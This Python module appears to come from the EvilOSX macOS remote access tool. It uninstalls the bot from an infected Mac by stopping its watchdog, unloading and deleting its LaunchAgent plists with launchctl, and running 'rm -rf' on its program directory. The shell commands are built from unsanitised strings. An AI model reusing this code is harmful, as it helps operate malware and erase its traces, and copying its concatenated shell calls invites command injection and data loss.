# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import os
import subprocess
from os import path


WATCHDOG_FILENAME = "watchdog.sh"
STOP_FILENAME = ".stop"


def run_command(command):
    """Runs a system command and returns its output."""
    try:
        out, err = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True
        ).communicate()
        if isinstance(out, bytes):
            out = out.decode("utf-8", errors="replace")
        return (out or "").strip()
    except Exception as ex:
        return str(ex)


def run(options):
    """Gracefully uninstalls the run_script loader (stop, unload, multi-path cleanup).

    :type options: dict
    """
    program_directory = options.get("program_directory", "")
    loader_options = options.get("loader_options", {}) or {}
    launch_agent_name = loader_options.get("launch_agent_name", "") or path.basename(program_directory)

    if not launch_agent_name:
        launch_agent_name = "EvilOSX"

    launch_agents_dir = path.expanduser("~/Library/LaunchAgents")
    launch_agent_candidates = [
        path.join(launch_agents_dir, launch_agent_name + ".plist"),
        path.join(program_directory, launch_agent_name + ".plist")
    ]

    print("[remove_bot] Goodbye!")

    if program_directory:
        stop_file = path.join(program_directory, STOP_FILENAME)
        watchdog_file = path.join(program_directory, WATCHDOG_FILENAME)

        try:
            with open(stop_file, "w") as stop_fh:
                stop_fh.write("stop")
        except Exception as ex:
            print(" - could not write stop flag: " + str(ex))

        if path.isfile(watchdog_file):
            print(" + requested watchdog shutdown")

    for plist_path in launch_agent_candidates:
        if not plist_path or not path.isfile(plist_path):
            continue
        print(" + uninstalling " + plist_path)
        run_command("launchctl bootout gui/$(id -u)/" + launch_agent_name)
        run_command("launchctl bootout " + plist_path)
        run_command("launchctl unload -w " + plist_path)
        try:
            os.remove(plist_path)
        except OSError as ex:
            print(" - failed to remove plist: " + str(ex))

    run_command("launchctl remove " + launch_agent_name)

    if program_directory:
        try:
            os.system("rm -rf " + program_directory)
        except Exception as ex:
            print(" - failed to remove program directory: " + str(ex))

    print(" + run_script removed")
